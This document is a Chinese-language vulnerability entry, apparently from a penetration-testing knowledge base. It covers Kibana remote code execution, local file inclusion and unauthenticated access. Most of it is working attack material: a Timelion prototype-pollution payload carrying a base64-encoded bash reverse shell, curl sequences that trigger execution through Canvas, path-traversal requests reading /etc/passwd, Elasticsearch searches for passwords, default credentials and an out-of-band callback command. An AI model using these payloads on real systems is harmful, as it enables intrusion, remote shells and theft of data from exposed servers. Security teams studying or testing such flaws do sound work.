---
id: KIBANA-RCE
title: Kibana 远程代码执行与SSRF漏洞
product: kibana
vendor: Elastic
version_affected: "CVE-2019-7609: < 6.6.1; CVE-2018-17246: < 6.4.3, < 5.6.13"
severity: CRITICAL
tags: [rce, ssrf, prototype_pollution, elk, 日志分析, 无需认证]
fingerprint: ["Kibana", "kibana", "/app/kibana", "/api/status", "kbn-xsrf", "kbn-version"]
---

## 漏洞描述

Kibana 存在多个RCE漏洞：原型链污染RCE(CVE-2019-7609)、Timelion SSRF(CVE-2018-17246)、任意文件包含等。

## 影响版本

- CVE-2019-7609（Timelion原型链污染RCE）: Kibana < 6.6.1
- CVE-2018-17246（LFI）: Kibana < 6.4.3, < 5.6.13
- 未授权访问: 未启用X-Pack Security的全版本

## 前置条件

- 目标开放 5601 端口，运行 Kibana
- Kibana 未启用认证（默认无认证）或使用默认凭据
- CVE-2019-7609 需访问 Timelion 功能

## 利用步骤

### CVE-2019-7609: Timelion 原型链污染 RCE

在 Kibana Timelion 中输入:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}");process.exit()//')
.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

然后点击运行，访问 Canvas 触发 RCE。

### CVE-2018-17246: 本地文件包含 (LFI)

```http
GET /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../etc/passwd HTTP/1.1
Host: target:5601
kbn-xsrf: true
```

### CVE-2021-22141: 开放重定向 + SSRF

```http
GET /api/saved_objects/_find?type=visualization&search_fields=title&search=*&fields=title&per_page=1000 HTTP/1.1
Host: target:5601
```

### 未授权访问

Kibana 默认无认证:
```bash
# 状态信息
curl http://target:5601/api/status
# 列出索引（通过 Elasticsearch）
curl http://target:9200/_cat/indices
# 搜索敏感数据
curl "http://target:9200/_search?q=password&size=50"
```

### 默认凭据 (X-Pack Security启用时)

- `elastic` / `changeme`
- `kibana` / `changeme`
- `kibana_system` / `changeme`

## Payload

```bash
# CVE-2019-7609: Timelion原型链污染RCE（通过API触发）
# Step 1: 注入原型链污染
curl -X POST "http://target:5601/api/timelion/run" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{"sheet":[".es(*).props(label.__proto__.env.AAAA=\"require(\\\"child_process\\\").exec(\\\"bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}\\\")\\/\\/\")"],"time":{"from":"now-1y","to":"now"}}'

# Step 2: 注入NODE_OPTIONS
curl -X POST "http://target:5601/api/timelion/run" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{"sheet":[".es(*).props(label.__proto__.env.NODE_OPTIONS=\"--require /proc/self/environ\")"],"time":{"from":"now-1y","to":"now"}}'

# Step 3: 触发Canvas渲染（RCE执行）
curl -s "http://target:5601/app/canvas" -H "kbn-xsrf: true"

# CVE-2018-17246: LFI
curl -s "http://target:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../etc/passwd" \
  -H "kbn-xsrf: true"
```

## 验证方法

```bash
# 未授权访问：响应体是 status JSON，含 version.number、name、status.overall.level 等键
curl -s http://target:5601/api/status
# 反例：401/403，或响应体为 Kibana 登录页 HTML → 已启用 X-Pack Security

# LFI (CVE-2018-17246)：响应体出现系统文件特征
curl -s "http://target:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../etc/passwd" \
  -H "kbn-xsrf: true"
# 判据：响应体出现 root:x:0:0: 或 /bin/bash 行；出现 Kibana 报错 JSON / HTML 页面都不是证据

# Timelion 原型链污染 (CVE-2019-7609) 存在性判定：分两次调用 /api/timelion/run
# 第一次按 ## Payload 注入上面的 AAAA 语句，第二次注入 NODE_OPTIONS
curl -s -X POST "http://target:5601/api/timelion/run" \
  -H "Content-Type: application/json" \
  -H "kbn-xsrf: true" \
  -d '{"sheet":[".es(*).props(label.__proto__.env.NODE_OPTIONS=\"--require /proc/self/environ\")"],"time":{"from":"now-1y","to":"now"}}'
# 判据：两次请求的响应体都是 Timelion 正常执行的结果 JSON（含 sheet 数组），
#      且注入语句被当作合法表达式接受、响应体里不出现 "Invalid" / 参数校验报错
# 反例：返回 400 语法错误或 403；只看到接口返回 200 不算，因为无回显路径
# 该漏洞无直接回显，命令执行证据按带外确认：把 AAAA 里的 exec 换成
#   require("child_process").exec("curl http://OOB_DOMAIN/POC_TOKEN")
# 再访问 /app/canvas 触发，判据是 OOB 侧收到携带 POC_TOKEN 的请求
curl -s "http://target:5601/app/canvas" -H "kbn-xsrf: true"
# 反例：OOB 侧一直没收到请求 → 不存在，不要换更重的 payload

# 版本判断
curl -s http://target:5601/api/status | grep -o '"number":"[^"]*"'
```

## 指纹确认

```bash
curl -s http://target:5601/api/status | grep -i "kibana"
curl -s http://target:5601/ | grep -i "kibana\|kbn"
curl -s -I http://target:5601/ | grep "kbn-name"
```
